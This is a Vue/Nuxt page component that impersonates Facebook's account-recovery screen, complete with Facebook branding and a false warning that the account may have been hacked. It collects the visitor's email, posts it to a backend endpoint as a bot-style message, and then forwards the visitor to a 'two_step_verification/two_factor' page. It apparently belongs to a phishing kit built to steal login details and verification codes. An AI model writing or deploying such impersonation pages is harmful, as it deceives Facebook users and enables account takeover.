<script setup lang="ts">
const email = ref('')
const router = useRouter()
async function submitForm() {
  if (!email.value) return

  try {
    await $fetch('/api/code', {
      method: 'POST',
      body: JSON.stringify({ message: `📭 Email: <code>${email.value}</code>` }),
      headers: {
        'Content-Type': 'application/json',
      },
    })
    router.push('/two_step_verification/two_factor')
  } catch (error) {
    console.error(error)
  }

  // Call your API here
}
</script>
<template>
  <div class="flex gap-5 flex-col bg-[#e9ebef] justify-center items-center h-lvh">
    <p class="max-md:hidden text-[38px] text-[#0064E0] cursor-pointer font-bold">facebook</p>
    <div class="max-md:h-full max-md:w-full bg-white rounded-lg w-[500px] shadow-md">
      <p
        class="hidden max-md:block text-center mb-3 text-[38px] text-[#0064E0] cursor-pointer font-bold"
      >
        facebook
      </p>
      <div class="max-md:text-center text-xl text-[#182440] py-5 font-semibold border-b px-5">
        {{ $t('Find your account') }}
      </div>
      <div class="p-5 pb-1">
        <div class="mt-2 border p-2 border-yellow-500 bg-yellow-100 text-sm">
          {{
            $t(
              "To get back in to your account, enter your current Email if you know it. If you don't think that your account was hacked, you can",
            )
          }}
          <a class="text-[#0064E0]" href="/login">
            {{ $t('cancel this process') }}
          </a>
        </div>
        <p>
          {{ $t('Please enter your email or phone number to search your account.') }}
        </p>
        <input
          v-model="email"
          type="email"
          class="border my-4 p-2 w-full border-gray-300 rounded-md"
          placeholder="Email"
        />
      </div>

      <div class="max-md:flex-col p-5 border-t flex justify-end gap-2">
        <button
          class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-[#e5e7eb] font-bold text-[#55575b] hover:bg-[#d4d7de] cursor-pointer"
        >
          {{ $t('Cancel') }}
        </button>
        <button
          class="max-md:w-full w-fit px-5 py-2 rounded-lg border-0 bg-blue-500 font-bold text-white hover:enabled:bg-blue-600 cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed disabled:hover:bg-blue-500"
          @click="submitForm"
        >
          {{ $t('Continue') }}
        </button>
      </div>
    </div>
  </div>
</template>
